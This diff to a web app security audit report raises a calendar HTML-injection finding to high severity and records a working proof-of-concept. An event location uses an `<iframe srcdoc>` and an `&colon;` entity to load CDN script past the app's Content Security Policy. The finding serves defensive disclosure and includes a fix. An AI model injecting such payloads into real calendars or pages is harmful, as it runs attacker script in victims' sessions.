@@ -99,8 +99,8 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
 
 - **Location:** `static/js/calendar.js:3437-3449` (the URL branch at `:3439-3444`; sinks at
   `:1709`, `:1775`, `:1902`, `:1915`)
-- **Severity:** medium
-- **Disposition:** next
+- **Severity:** high
+- **Disposition:** fix-now
 - **Evidence:** `_locHTML` escapes each matched URL and nothing else — the text between URLs is
   concatenated into the returned HTML unescaped:
 
@@ -138,8 +138,8 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
 - **Impact:** anyone who can write an event into a calendar the user syncs (a shared or public
   CalDAV collection, or an `.ics` file the user imports) gets arbitrary HTML and CSS rendered inside
   the calendar modal: remote fetches that disclose the user's IP and confirm the calendar is open,
-  CSS that can hide or overlay calendar chrome, and markup that survives until the view re-renders.
-  Script execution is not reachable: `script-src` in the app's policy has no `'unsafe-inline'`, and
+  CSS that can hide or overlay calendar chrome, markup that survives until the view re-renders, and, through an injected `<iframe srcdoc>`, script from `cdn.jsdelivr.net` running in the user's session.
+  An inline handler does not run: `script-src` in the app's policy has no `'unsafe-inline'`, and
   a companion page served with that exact policy (`core/middleware.py:141-152`, `nonce-dummy`
   standing in for the per-response nonce) logged `Executing inline event handler violates the
   following Content Security Policy directive 'script-src 'self' 'nonce-dummy'
@@ -147,6 +147,15 @@ verbatim, and one probe page is served with the app's exact CSP header copied fr
   probe page itself was served without the header, so its console was empty; the `<style>` and
   `<img>` effects above are what the policy does not stop, since `style-src` allows `'unsafe-inline'`
   and `img-src` allows `https:` and same-origin fetches.
+- **Re-review (2026-10-05):** raised from medium to high. The first pass tested an inline handler,
+  which the policy refuses, and concluded that script execution is not reachable. With `_locHTML`
+  copied by line range onto a page served with the app's policy, the location
+  `https://maps.example.test/room5 <iframe srcdoc="<script
+  src=https&colon;//cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">` ran the CDN
+  script in a frame whose origin is the page's. The `&colon;` keeps the script URL out of the
+  linkifier's `https?://` match. The same location without a leading URL takes the escaped branch
+  and does not execute. The script acts with the session of whoever opens the event. See the
+  policy finding in `core-auth-session`.
 - **Fix:** escape the whole string first and linkify the escaped copy, the way
   `static/js/notes.js:517-529` already does (`const escaped = _esc(s); … escaped.replace(urlRe, …)`).
 
